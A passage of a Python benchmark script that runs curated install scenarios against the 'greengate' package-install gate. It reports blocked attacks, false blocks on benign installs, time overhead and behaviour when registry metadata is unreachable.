                  f"| **Attack effects prevented** | **{pct(mal['preflight'] + mal['prevented'], total_mal)}** |",
                  f"| Benign installs permitted and working | {ben['permitted']} / {total_ben} |",
                  f"| Benign installs blocked (false blocks) | {ben['blocked']} / {total_ben} |",
                  f"| Benign installs passed but broken | {ben['broken']} / {total_ben} |",
                  f"| Errors / skipped | {mal['error'] + ben['error']} / {mal['skipped'] + ben['skipped']} |", ""]
        overheads = [tr["seconds"] - tr["plain_seconds"] for r in results if r["label"] == "benign"
                     for tr in r["modes"][mode] if "plain_seconds" in tr]
        if overheads:
            lines += [f"Added wall time over the same install without greengate (benign scenarios): "
                      f"median {statistics.median(overheads):.1f} s, max {max(overheads):.1f} s.", ""]
    down = [tr for r in results for tr in r.get("metadata_down", [])]
    if down:
        oc = Counter(tr["outcome"] for tr in down)
        lines += ["## Registry metadata and OSV unreachable", "",
                  "Every scenario again (`--isolate bwrap` when available), with release metadata and "
                  "OSV pointed at a closed port. Acceptable results are *incomplete* (exit 3) or *blocked*; "
                  "a pass would mean unchecked packages went in.", "",
                  "| Result | Trials |", "|---|---:|"]
        lines += [f"| {k} | {oc[k]} |" for k in ("incomplete", "blocked", "nothing to look up", "passed unchecked", "error") if oc[k]]
        needed = len(down) - oc["nothing to look up"]
        lines += ["", f"Of the {needed} trial(s) that needed metadata, **{oc['passed unchecked']} passed unchecked** "
                  f"({oc['incomplete']} incomplete, {oc['blocked']} blocked). Installs of an unchanged lockfile "
                  "(`npm ci`) look nothing up: release checks cover what an install adds or changes.", ""]
    lines += ["## Scenarios", "", "| Scenario | Ground truth | " + " | ".join(f"`{m}`" for m in modes) +
              " | Description |", "|---|---|" + "---|" * len(modes) + "---|"]
    for r in results:
        cells = []
        for m in modes:
            oc = Counter(tr["outcome"] for tr in r["modes"][m])
            rules = sorted({rule for tr in r["modes"][m] for rule in tr.get("rules", [])})
            cell = ", ".join(f"{k} {v}/{repeats}" for k, v in sorted(oc.items()))
            if rules:
                cell += " (" + ", ".join(f"`{x}`" for x in rules[:3]) + ")"
            cells.append(cell)
        lines.append(f"| `{r['id']}` | {r['label']} | " + " | ".join(cells) + f" | {r['description']} |")
    lines += ["", "## Reproduction and limits", "",
              "- `python3 bench/install/gate.py --greengate-bin target/release/greengate` (needs npm, "
              "python3 with venv, cargo, and optionally bwrap and cc).",
              "- The fixture registry, wheelhouse and crates are built per run in `gate.py`; the `cc` and "
              "`shlex` crates come from the local cargo cache.",
              "- The name guard (`slopsquat_check`) is off: it needs the public npm downloads API.",
              "- `npm-prebuilt-download` uses the documented allowlists (`allow_postinstall`, "
              "`script_network`), as a real esbuild-style package would.",
              "- These are a dozen curated scenarios, not a measure of real-world attack prevalence.", ""]
    if metadata:
        lines += [f"- Environment: {metadata['platform']}; Python {metadata['python']}; "
                  f"binary SHA-256 `{metadata['binary_sha256']}`.", ""]
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--greengate-bin", type=Path, default=REPO / "target/release/greengate")
    parser.add_argument("--out", type=Path, default=BENCH / "INSTALL_GATE_RESULTS.md")
    parser.add_argument("--json-out", type=Path, default=BENCH / "INSTALL_GATE_RESULTS.json")
    parser.add_argument("--repeats", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=180)
    parser.add_argument("--only", help="comma-separated scenario ids")
    parser.add_argument("--no-metadata-down", action="store_true", help="skip the unreachable-metadata pass")
    args = parser.parse_args()
    binary = args.greengate_bin.resolve()
    if not binary.is_file():
        parser.error(f"greengate binary not found: {binary}")
    for tool in ("npm", "cargo"):
        if not shutil.which(tool):
            parser.error(f"{tool} is required")
    compiler = shutil.which("cc")
    modes = (["bwrap"] if shutil.which("bwrap") else []) + ["none"]
    version = subprocess.run([str(binary), "--version"], capture_output=True, text=True, check=True).stdout.strip()
    digest = hashlib.sha256(binary.read_bytes()).hexdigest()
    metadata = {"platform": platform.platform(), "python": platform.python_version(), "binary_sha256": digest}

    root = Path(tempfile.mkdtemp(prefix="gg-gate-registry-"))
    try:
        # The port is needed inside fixtures, so start the server first.
        reg = Registry()
        server = serve(reg)
        port = server.server_address[1]
        base = f"http://127.0.0.1:{port}"
        built, wheelhouse = build_registry(base, port, root, compiler)
        reg.files.update(built.files)
        scenarios = [{"id": i, "label": l, "eco": e, "description": d} for i, l, e, d in SCENARIOS]
        if args.only:
            wanted = set(args.only.split(","))
            scenarios = [s for s in scenarios if s["id"] in wanted]
        if "/crates/dl/native-sys/1.0.0" not in reg.files:
            scenarios = [s for s in scenarios if s["id"] != "cargo-cc-build"]
        results = []
        for case in scenarios:
            r = {**case, "modes": {}}
            for mode in modes:
                r["modes"][mode] = [run_case(case, base, port, wheelhouse, binary, args.timeout, mode, False, compiler)
                                    for _ in range(args.repeats)]
            if not args.no_metadata_down:
                r["metadata_down"] = [run_case(case, base, port, wheelhouse, binary, args.timeout, modes[0], True, compiler)]
            results.append(r)
            summary = "; ".join(f"{m}: " + ",".join(tr["outcome"] for tr in r["modes"][m]) for m in modes)
            down = ",".join(tr["outcome"] for tr in r.get("metadata_down", []))
            print(f"{case['id']}: {summary}" + (f"; metadata down: {down}" if down else ""), flush=True)
        server.shutdown()
    finally:
        shutil.rmtree(root, ignore_errors=True)
    args.out.write_text(build_report(results, version.split()[-1], args.repeats, modes, metadata), encoding="utf-8")
    args.json_out.write_text(json.dumps({"version": version, "repeats": args.repeats, **metadata,
                                         "modes": modes, "results": results}, indent=2) + "\n", encoding="utf-8")
    print(f"Report: {args.out}; raw trials: {args.json_out}")
    errors = sum(1 for r in results for m in r["modes"].values() for tr in m if tr["outcome"] == "error")
    return 1 if errors else 0


if __name__ == "__main__":
    sys.exit(main())
